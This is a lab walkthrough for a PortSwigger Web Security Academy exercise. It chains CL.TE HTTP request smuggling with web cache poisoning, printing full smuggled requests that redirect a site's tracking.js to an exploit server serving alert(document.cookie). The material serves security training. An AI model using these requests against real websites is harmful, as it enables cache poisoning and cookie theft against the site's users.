# Lab 11 — Exploiting HTTP request smuggling to perform web cache poisoning

> **Scope:** PortSwigger Web Security Academy / authorized lab environment only.

## Objective & Context

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.

To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert document.cookie.

Notes
Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
> **Tip**
Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

## Walkthrough

Open a blog post, click "Next post", and try smuggling the resulting request with a different Host header:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Transfer-Encoding: chunked
```

0

```http
GET /post/next?postId=3 HTTP/1.1
Host: anything
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
```

x=1
Observe that you can use this request to make the next request to the website get redirected to /post on a host of your choice.
Go to your exploit server, and create a text/javascript file at /post with the contents:

alert(document.cookie)
Poison the server cache by first relaunching the previous attack using your exploit server's hostname as follows:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Transfer-Encoding: chunked
```

0

```http
GET /post/next?postId=3 HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
```

x=1
Then fetch /resources/js/tracking.js by sending the following request:

```http
GET /resources/js/tracking.js HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: close
If the attack has succeeded, the response to the tracking.js request should be a redirect to your exploit server.
```

Confirm that the cache has been poisoned by repeating the request to tracking.js several times and confirming that you receive the redirect every time.
> **Note**
You may need to repeat the POST/GET process several times before the attack succeeds.
